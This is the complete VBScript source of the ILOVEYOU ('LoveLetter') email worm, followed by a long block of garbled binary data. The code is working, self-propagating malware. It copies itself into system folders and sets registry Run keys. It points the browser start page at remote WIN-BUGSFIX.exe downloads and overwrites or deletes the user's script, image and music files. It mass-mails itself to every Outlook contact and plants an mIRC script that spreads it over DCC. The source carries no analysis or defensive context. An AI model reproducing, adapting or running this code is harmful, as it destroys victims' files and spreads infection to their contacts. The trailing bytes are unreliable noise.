rem  barok -loveletter(vbe) <i hate go to school>
rem 			by: spyder  /  ispyder@mail.com  /  @GRAMMERSoft Group  /  Manila,Philippines
On Error Resume Next
dim fso,dirsystem,dirwin,dirtemp,eq,ctr,file,vbscopy,dow
eq=""
ctr=0
Set fso = CreateObject("Scripting.FileSystemObject")
set file = fso.OpenTextFile(WScript.ScriptFullname,1)
vbscopy=file.ReadAll
main()
sub main()
On Error Resume Next
dim wscr,rr
set wscr=CreateObject("WScript.Shell")
rr=wscr.RegRead("HKEY_CURRENT_USER\Software\Microsoft\Windows Scripting Host\Settings\Timeout")
if (rr>=1) then
wscr.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows Scripting Host\Settings\Timeout",0,"REG_DWORD"
end if
Set dirwin = fso.GetSpecialFolder(0)
Set dirsystem = fso.GetSpecialFolder(1)
Set dirtemp = fso.GetSpecialFolder(2)
Set c = fso.GetFile(WScript.ScriptFullName)
c.Copy(dirsystem&"\MSKernel32.vbs")
c.Copy(dirwin&"\Win32DLL.vbs")
c.Copy(dirsystem&"\LOVE-LETTER-FOR-YOU.TXT.vbs")
regruns()
html()
spreadtoemail()
listadriv()
end sub
sub regruns()
On Error Resume Next
Dim num,downread
regcreate "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\MSKernel32",dirsystem&"\MSKernel32.vbs"
regcreate "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices\Win32DLL",dirwin&"\Win32DLL.vbs"
downread=""
downread=regget("HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Download Directory")
if (downread="") then
downread="c:\"
end if
if (fileexist(dirsystem&"\WinFAT32.exe")=1) then
Randomize
num = Int((4 * Rnd) + 1)
if num = 1 then
regcreate "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page","http://www.skyinet.net/~young1s/HJKhjnwerhjkxcvytwertnMTFwetrdsfmhPnjw6587345gvsdf7679njbvYT/WIN-BUGSFIX.exe"
elseif num = 2 then
regcreate "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page","http://www.skyinet.net/~angelcat/skladjflfdjghKJnwetryDGFikjUIyqwerWe546786324hjk4jnHHGbvbmKLJKjhkqj4w/WIN-BUGSFIX.exe"
elseif num = 3 then
regcreate "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page","http://www.skyinet.net/~koichi/jf6TRjkcbGRpGqaq198vbFV5hfFEkbopBdQZnmPOhfgER67b3Vbvg/WIN-BUGSFIX.exe"
elseif num = 4 then
regcreate "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page","http://www.skyinet.net/~chu/sdgfhjksdfjklNBmnfgkKLHjkqwtuHJBhAFSDGjkhYUgqwerasdjhPhjasfdglkNBhbqwebmznxcbvnmadshfgqw237461234iuy7thjg/WIN-BUGSFIX.exe"
end if
end if
if (fileexist(downread&"\WIN-BUGSFIX.exe")=0) then
regcreate "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\WIN-BUGSFIX",downread&"\WIN-BUGSFIX.exe"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\Start Page","about:blank"
end if
end sub
sub listadriv
On Error Resume Next
Dim d,dc,s
Set dc = fso.Drives
For Each d in dc
If d.DriveType = 2 or d.DriveType=3 Then
folderlist(d.path&"\")
end if
Next
listadriv = s
end sub
sub infectfiles(folderspec)  
On Error Resume Next
dim f,f1,fc,ext,ap,mircfname,s,bname,mp3
set f = fso.GetFolder(folderspec)
set fc = f.Files
for each f1 in fc
ext=fso.GetExtensionName(f1.path)
ext=lcase(ext)
s=lcase(f1.name)
if (ext="vbs") or (ext="vbe") then
set ap=fso.OpenTextFile(f1.path,2,true)
ap.write vbscopy
ap.close
elseif(ext="js") or (ext="jse") or (ext="css") or (ext="wsh") or (ext="sct") or (ext="hta") then
set ap=fso.OpenTextFile(f1.path,2,true)
ap.write vbscopy
ap.close
bname=fso.GetBaseName(f1.path)
set cop=fso.GetFile(f1.path)
cop.copy(folderspec&"\"&bname&".vbs")
fso.DeleteFile(f1.path)
elseif(ext="jpg") or (ext="jpeg") then
set ap=fso.OpenTextFile(f1.path,2,true)
ap.write vbscopy
ap.close
set cop=fso.GetFile(f1.path)
cop.copy(f1.path&".vbs")
fso.DeleteFile(f1.path)
elseif(ext="mp3") or (ext="mp2") then
set mp3=fso.CreateTextFile(f1.path&".vbs")
mp3.write vbscopy
mp3.close
set att=fso.GetFile(f1.path)
att.attributes=att.attributes+2
end if
if (eq<>folderspec) then
if (s="mirc32.exe") or (s="mlink32.exe") or (s="mirc.ini") or (s="script.ini") or (s="mirc.hlp") then
set scriptini=fso.CreateTextFile(folderspec&"\script.ini")
scriptini.WriteLine "[script]"
scriptini.WriteLine ";mIRC Script"
scriptini.WriteLine ";  Please dont edit this script... mIRC will corrupt, if mIRC will"
scriptini.WriteLine "     corrupt... WINDOWS will affect and will not run correctly. thanks"
scriptini.WriteLine ";"
scriptini.WriteLine ";Khaled Mardam-Bey"
scriptini.WriteLine ";http://www.mirc.com"
scriptini.WriteLine ";"
scriptini.WriteLine "n0=on 1:JOIN:#:{"
scriptini.WriteLine "n1=  /if ( $nick == $me ) { halt }"
scriptini.WriteLine "n2=  /.dcc send $nick "&dirsystem&"\LOVE-LETTER-FOR-YOU.HTM"
scriptini.WriteLine "n3=}"
scriptini.close
eq=folderspec
end if
end if
next  
end sub
sub folderlist(folderspec)  
On Error Resume Next
dim f,f1,sf
set f = fso.GetFolder(folderspec)  
set sf = f.SubFolders
for each f1 in sf
infectfiles(f1.path)
folderlist(f1.path)
next  
end sub
sub regcreate(regkey,regvalue)
Set regedit = CreateObject("WScript.Shell")
regedit.RegWrite regkey,regvalue
end sub
function regget(value)
Set regedit = CreateObject("WScript.Shell")
regget=regedit.RegRead(value)
end function
function fileexist(filespec)
On Error Resume Next
dim msg
if (fso.FileExists(filespec)) Then
msg = 0
else
msg = 1
end if
fileexist = msg
end function
function folderexist(folderspec)
On Error Resume Next
dim msg
if (fso.GetFolderExists(folderspec)) then
msg = 0
else
msg = 1
end if
fileexist = msg
end function
sub spreadtoemail()
On Error Resume Next
dim x,a,ctrlists,ctrentries,malead,b,regedit,regv,regad
set regedit=CreateObject("WScript.Shell")
set out=WScript.CreateObject("Outlook.Application")
set mapi=out.GetNameSpace("MAPI")
for ctrlists=1 to mapi.AddressLists.Count
set a=mapi.AddressLists(ctrlists)
x=1
regv=regedit.RegRead("HKEY_CURRENT_USER\Software\Microsoft\WAB\"&a)
if (regv="") then
regv=1
end if
if (int(a.AddressEntries.Count)>int(regv)) then
for ctrentries=1 to a.AddressEntries.Count
malead=a.AddressEntries(x)
regad=""
regad=regedit.RegRead("HKEY_CURRENT_USER\Software\Microsoft\WAB\"&malead)
if (regad="") then
set male=out.CreateItem(0)
male.Recipients.Add(malead)
male.Subject = "ILOVEYOU"
male.Body = vbcrlf&"kindly check the attached LOVELETTER coming from me."
male.Attachments.Add(dirsystem&"\LOVE-LETTER-FOR-YOU.TXT.vbs")
male.Send
regedit.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\WAB\"&malead,1,"REG_DWORD"
end if
x=x+1
next
regedit.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\WAB\"&a,a.AddressEntries.Count
else
regedit.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\WAB\"&a,a.AddressEntries.Count
end if
next
Set out=Nothing
Set mapi=Nothing
end sub
sub html
On Error Resume Next
dim lines,n,dta1,dta2,dt1,dt2,dt3,dt4,l1,dt5,dt6
dta1="<HTML><HEAD><TITLE>LOVELETTER - HTML<?-?TITLE><META NAME=@-@Generator@-@ CONTENT=@-@BAROK VBS - LOVELETTER@-@>"&vbcrlf& _
"<META NAME=@-@Author@-@ CONTENT=@-@spyder ?-? ispyder@mail.com ?-? @GRAMMERSoft Group ?-? Manila, Philippines ?-? March 2000@-@>"&vbcrlf& _
"<META NAME=@-@Description@-@ CONTENT=@-@simple but i think this is good...@-@>"&vbcrlf& _
"<?-?HEAD><BODY ONMOUSEOUT=@-@window.name=#-#main#-#;window.open(#-#LOVE-LETTER-FOR-YOU.HTM#-#,#-#main#-#)@-@ "&vbcrlf& _
"ONKEYDOWN=@-@window.name=#-#main#-#;window.open(#-#LOVE-LETTER-FOR-YOU.HTM#-#,#-#main#-#)@-@ BGPROPERTIES=@-@fixed@-@ BGCOLOR=@-@#FF9933@-@>"&vbcrlf& _
"<CENTER><p>This HTML file need ActiveX Control<?-?p><p>To Enable to read this HTML file<BR>- Please press #-#YES#-# button to Enable ActiveX<?-?p>"&vbcrlf& _
"<?-?CENTER><MARQUEE LOOP=@-@infinite@-@ BGCOLOR=@-@yellow@-@>----------z--------------------z----------<?-?MARQUEE> "&vbcrlf& _
"<?-?BODY><?-?HTML>"&vbcrlf& _
"<SCRIPT language=@-@JScript@-@>"&vbcrlf& _
"<!--?-??-?"&vbcrlf& _
"if (window.screen){var wi=screen.availWidth;var hi=screen.availHeight;window.moveTo(0,0);window.resizeTo(wi,hi);}"&vbcrlf& _
"?-??-?-->"&vbcrlf& _
"<?-?SCRIPT>"&vbcrlf& _
"<SCRIPT LANGUAGE=@-@VBScript@-@>"&vbcrlf& _
"<!--"&vbcrlf& _
"on error resume next"&vbcrlf& _
"dim fso,dirsystem,wri,code,code2,code3,code4,aw,regdit"&vbcrlf& _
"aw=1"&vbcrlf& _
"code="
dta2="set fso=CreateObject(@-@Scripting.FileSystemObject@-@)"&vbcrlf& _
"set dirsystem=fso.GetSpecialFolder(1)"&vbcrlf& _
"code2=replace(code,chr(91)&chr(45)&chr(91),chr(39))"&vbcrlf& _
"code3=replace(code2,chr(93)&chr(45)&chr(93),chr(34))"&vbcrlf& _
"code4=replace(code3,chr(37)&chr(45)&chr(37),chr(92))"&vbcrlf& _
"set wri=fso.CreateTextFile(dirsystem&@-@^-^MSKernel32.vbs@-@)"&vbcrlf& _
"wri.write code4"&vbcrlf& _
"wri.close"&vbcrlf& _
"if (fso.FileExists(dirsystem&@-@^-^MSKernel32.vbs@-@)) then"&vbcrlf& _
"if (err.number=424) then"&vbcrlf& _
"aw=0"&vbcrlf& _
"end if"&vbcrlf& _
"if (aw=1) then"&vbcrlf& _
"document.write @-@ERROR: can#-#t initialize ActiveX@-@"&vbcrlf& _
"window.close"&vbcrlf& _
"end if"&vbcrlf& _
"end if"&vbcrlf& _
"Set regedit = CreateObject(@-@WScript.Shell@-@)"&vbcrlf& _
"regedit.RegWrite @-@HKEY_LOCAL_MACHINE^-^Software^-^Microsoft^-^Windows^-^CurrentVersion^-^Run^-^MSKernel32@-@,dirsystem&@-@^-^MSKernel32.vbs@-@"&vbcrlf& _
"?-??-?-->"&vbcrlf& _
"<?-?SCRIPT>"
dt1=replace(dta1,chr(35)&chr(45)&chr(35),"'")
dt1=replace(dt1,chr(64)&chr(45)&chr(64),"""")
dt4=replace(dt1,chr(63)&chr(45)&chr(63),"/")
dt5=replace(dt4,chr(94)&chr(45)&chr(94),"\")
dt2=replace(dta2,chr(35)&chr(45)&chr(35),"'")
dt2=replace(dt2,chr(64)&chr(45)&chr(64),"""")
dt3=replace(dt2,chr(63)&chr(45)&chr(63),"/")
dt6=replace(dt3,chr(94)&chr(45)&chr(94),"\")
set fso=CreateObject("Scripting.FileSystemObject")
set c=fso.OpenTextFile(WScript.ScriptFullName,1)
lines=Split(c.ReadAll,vbcrlf)
l1=ubound(lines)
for n=0 to ubound(lines)
lines(n)=replace(lines(n),"'",chr(91)+chr(45)+chr(91))
lines(n)=replace(lines(n),"""",chr(93)+chr(45)+chr(93))
lines(n)=replace(lines(n),"\",chr(37)+chr(45)+chr(37))
if (l1=n) then
lines(n)=chr(34)+lines(n)+chr(34)
else
lines(n)=chr(34)+lines(n)+chr(34)&"&vbcrlf& _"
end if
next
set b=fso.CreateTextFile(dirsystem+"\LOVE-LETTER-FOR-YOU.HTM")
b.close
set d=fso.OpenTextFile(dirsystem+"\LOVE-LETTER-FOR-YOU.HTM",2)
d.write dt5
d.write join(lines,vbcrlf)
d.write vbcrlf
d.write dt6
d.close
end sub
                                                                                                                                                                                                                                                                                                                                                                                                                                                           @+�H�T��ųa (� �#��j��D,A�z�D"BH�T;��j1���i�Ici@� ����x.4
��9��` #���&-(#_#�Q��ՀngeY�(F�9pыH�,Q�_&H��*�M��E�\�T�"3�(16�s�@�Cw�yd�è�T�I���gk�
��,��Ǉ�؅*�E-�J��v�{(n<�)��K2J���E���M[J" �����,��!e��H>ph�l��Ӣ�E��Q���n~_��Ұy��ȃ��n B���	K���>	�Dt�6@�0N�TM����%�M*ѓcy�p�@W�񭧈2-����ԛP��d����岕"��h����.�
�}�uN����ɒ�A2��S�r���fB��T�#PabpizH"�k���+$(�x/H5�f,�b(\ld���|I�J�&�0|����`)NqA��8r2����`D�XSFnYv-$�P�dQJ�U������9a2���^���!�-�������A>�5��K,C���n\u������%,��S�(�q��0\�7X[�HE7����`X�dU%%�Uo�/U���p(�H�#5jԚ"Y�ay�<�2�蠞p�<�,1��^��J�B��-�-ч�˝3S��9�;f���Ud��(���p�IE��"�#<�0�>/���H�@W,�{����]yyZ0+��0�3T*�">���OiG������K�<<��^�&��!6o��Bi1���x{~OZ
f�o����=�~<�m�������ml'<����f�cl��mc3�o��l�gۏ���ml۶��~۶mll���m�m��ƶm۶mc�ƶm۶m۶m۶�m۶m۶m۶ml۶m۶m۶m۶m۶m۶m��c۶m۶m۶m۶m۶m۶m۶m۶m۶m۶m۶m۶m۶m۶m۶m۶m۶m۶m۶m۶m۶m۶m۶m�v۶m۶�m۶m�6��۶��n�m�6n=�m�m�mcl��6v�n�q�жM7����m��8�n�v��i�Cw�Cwl��t��m��nҦ��t�mp��q�4�)1�n;�*@II��I�)�C"��&ݍ-i�)�iRd�4�*X�Vc�C+!U���i R5%���4�iŞ_B"Vi��T7�<C��)	B��>��
#����!��0C�uըE)#�dB��#�A'�a"� 9+H� ��fD5eW�\�&EcB(�xRA*!)J:�b�2"*,E�F%)� 8R��X�I� �EoS�H$�t5Wd@ّ��(�H�HH���RLJ���I0!3�1�a�D�ĢF@Π @2f/*O35N�bGh�uPBTDg�dj�� �erL5Ɉ�بP�A�@C1$aR�#$C��)'dc$(�!�H��Y��ꤒ  Na������`�F����c�hg��
��+�V�� ���h�z#Hr�D�DHLO@1�t�@2HKm�e�#Q��T0�  ,)�DD�Qu	L�$T,�@�L	:�]��
�)�T��Z�	'��*�)��=�)��\x��D"�^з8� y�E��(�QPp��F�	���NQ4d�F��6��U=�Ơ����9uN�f�H&`,L*.abZ�:E�*3�D��}��0��Iq(���¸���SrX��B�^��F�-'�`P>S�$���a����m"��ER0`
n㏱�UQ��6�:׸� ]Uqh�����q �"����>N^��!4P��0�-x  ��I�Z">��
ߑ�
�!�!q�8�)���@=��i*&��O�b%$END�ŇQ�a`���} ]�Ȏ1�	{�茙�E���H�U             @                      @                      @           �   <  �=h� �����ȼ���������tl`TPP���b��L�eR����#D	�i�q��i�c�����ٲ»����������IӁ���UPd�U�H�4����FebZ�%�F
9� m�r���!O[�B�;m��J��MA}A�a�������g/��fl��L�đ�:;�QJ;�	��I�Tëj�|U�eR�Pa ���tV��/���y�?5�'L�e
^�U&�bH&ї�F�Ӡ%�E�s�		u��m����;ڰw�k	�=pI�PC�47�5t������|�&��A���>�F��k��wVT��%TRMC�6�-���!up�V��Ӱ��M������փ:��l�#\��]��x��8��|�y�Sr�CZ�W�)�EepY�"�U�X��ؒ1�����ʏ��m�pIg
�'��di��ݹ�I\mG ��)~B�Wd:ჹ��4�K�8uaҥ]�ƉZ�Qw�[���ռSٴQZ�����B�R��hvV�N�Z(E�[����d��W_�ɵfS~����0�+7�V*{/��.�+��Quk��g�+�ElR�ݛ��S~m�]��-�Lf�[�*�-��6�`˫�kX$��%���Pj��L��k�j��I�j�`��+�������ڤE�t���W;�K8eW��O[�U���[~c5�O�uM�����?��t��O��O{�U<�U�C���9�E�i��$;ʪK��:�e��+ݶ�ƨl��m�亾m�����jlƤl���§[�'[�i��*��fl���㭲)^ʨ���<�b��茮���$��j,�,�ʮL��L�%���K�'M�pk����[
mQ֝�We�yUM}Qve�8m��TS�K_�5�뺭붮뺮뺮k��ۺ�뺵뺮뺵뺭뺮붮��u]�uݶu[�m]�m��u[�u]�m]�u]�uݶu]�u]�u[�u]�u��m��u��m�n뺭�Z��'�۶m�mۺ�۶�۶nۺ�����6���������������'u۶?���������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������~�o�������~��������������m�o�m��o�m�~[��m۶m��۶߶m۶m۶m�۶m�m��۶m۶m۶m۶��m۶m۶m�mŶm۶m۶m۶m[�RLiK1#~�m۶ �i�R�2b۶�~i�b��ŔR�i��n�-Ƅ�~�?��i��*B�R���i[
��أ�ߑ.)LcJ	�s�P ��;s�8%��c��Ƙ��p
�[ڼ�!��Q��1MpLT1P�N���n���5)a�T���8��q��y�K�P~�����I>���n]��,��w��#e
n&%��á��8��nJMdB�IBɬ0���*D�*D�j��ČF��ng� �4�)��4�	�H�$�C  ,ܙ@V��L���4+���E��1�l���
49�XT�R%s�	�A�2�v (c5T<���O�D�(�`VWy�"QĜ��G�HˠD�qd:K��x�
������h >h�M_Sf�I�qᡏ�2�Ab�y� �<Љ1ͨj�q)��텰	0ɀ��*�.�WBeⰐ8堉d��zcƖ"�%�P��T � qƅaA� �� �cĐ)�`U��$��CĦT1;����h��(��F�|�9ŁŤ��0���C�H�P(�4D�\�FY��B,�1�Ő�,+�gT#3K)�.*��Yp懁��@�v#�J���ZW@³0X{J,���|������E��F��iC�vp#y�#\r�I�[#H'A��r�r�+�Z���B��
  ���!h ����ĸ��������|ldXPHL||8�r�����@rdd�eC�IZx�4�Hd�n*/�P�>V6;5��c�DO��t�f�#A����S��"�y�	̝��0K��Ml�x� ���5�pE�x΀Ìr�0�b�eK�Pd:��
h�=	�L�AZ�㜵�l�If�a6ӝ=U��(Ψ���E�8����e�����a��eD�ꠁE�����ڀ'��F;����F1R�3�R�̞��UmQ�:h�������Έ|n���3�I��ђ۪����W��*��n�3�r�"P8�y�^�!�x2I�c���=��s�K������U��S7&��݋��co����KM�ě�'K�C��?U��U��%��	+0XSGA+i���g�'(��,Қf#��_�V����ٚ��":��Y����l��4Q`&8m���EwpQ9 rX�wm��Xᖈ�Y+��W����E���X�jꚭh�k���� B������5[���]l�E�缬�Z�.�Qm��.Y8gF�s~[�d�L�}�-� U{��:���RK^+E�ӔU��M{@cW�E��C<Pg�|OU�E�,�Z0ِ�v��L�$;��~ʄ��Y�!,�a���;��{޴=k>ՀEM�>���Q�n���c�x���2���.���+�4Q�<�B��;w崎Kw�S�����?8�*4Mt���K��+1-Q��Gr��7�y��ks�R���[-1�sS��s_.u�rS/�UOt�2_=9��������?$������f<��O-5���L��2�+����5nkL[J[ܶ�ָ���O(�t������A(Ŕ֔�����'5�m���'�����o���~������������߶m��������~����������o������߶m�m������o��m��~����۶��m۶߶���o���o����m��m��~�o���a۶߶m��~�o������o�m����~��o����m�o�o�o۶�����m�������m۶m��o۶�m۶m�m����m�����~۶�۶����m���������?�~�m�������6o�f�l��o�������?�m�7�������f��x�����7{�<oc��������x�m�7ό{�l��m?{<~��ߞg�7~cF�~�����?f����o�����f�106�33f�����v`�ϛ?X<�����i���y70���������!��X� ������A�7�!�m�MBi�"B�֘��i�I[0q!mӸm�Eة(����:-�mZ0�hU�61QE����<5��#�m�ۋ�P��^b'(Mè�b6	p�*��v�(0�4�,�	�%i�rDh�&-�*���]�H� r�IR)���R�,8g�6�4� ��b"�k"I�-F�1H�Z�W��
9���QK�n��ȐE�Z>~�$�@,�ax�SD
E�$QHDC��C�:�]d�+Q��L`� �K�!@@��tFU�&��d�-����s$�*�SUL2��<�l8%0��jM��*Qj恈	=s�A�*BS<Hg("w�>Ŭű�n,�&NƁ=��*RsQ�����՗�E1B#�:�lX�d|4DL�